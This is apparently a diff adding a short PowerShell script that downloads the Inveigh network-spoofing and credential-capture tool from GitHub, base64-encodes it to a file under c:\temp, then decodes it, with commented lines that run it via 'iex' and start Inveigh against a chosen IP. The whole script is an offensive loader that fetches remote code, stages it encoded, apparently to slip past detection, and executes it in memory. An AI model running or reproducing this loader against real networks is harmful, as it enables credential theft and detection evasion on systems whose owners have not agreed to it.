@@ -1,0 +1,29 @@
+#Encode-Invoke-Inveigh
+
+### Retrieving, encoding and storing Inveigh script ###
+#Get code from github
+$url = "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1"
+$code = (New-Object System.Net.WebClient)."DownloadString"($url); 
+
+#Convert code to base64
+$byteCode  = [System.Text.Encoding]::UTF8.GetBytes($code)
+$base64Code = [System.Convert]::ToBase64String($byteCode)
+
+#Save encoded script to local file system
+$base64Code | Out-File c:\temp\encodedInveigh.txt
+
+################################################################################################
+
+### Retrieving local encoded script, converting back to original code then executing
+#Now run the encoded local payload
+$base64Code = Get-Content C:\temp\encodedInveigh.txt -Raw
+
+#Convert base64 to bytes 
+$byteCode = [System.Convert]::FromBase64String($base64Code)
+
+#Convert bytes to string
+$string = [text.Encoding]::UTF8.GetString($byteCode)
+
+#Usage of tool:
+#iex $string
+#Invoke-Inveigh -ConsoleOutput Y -IP YOUR-IP
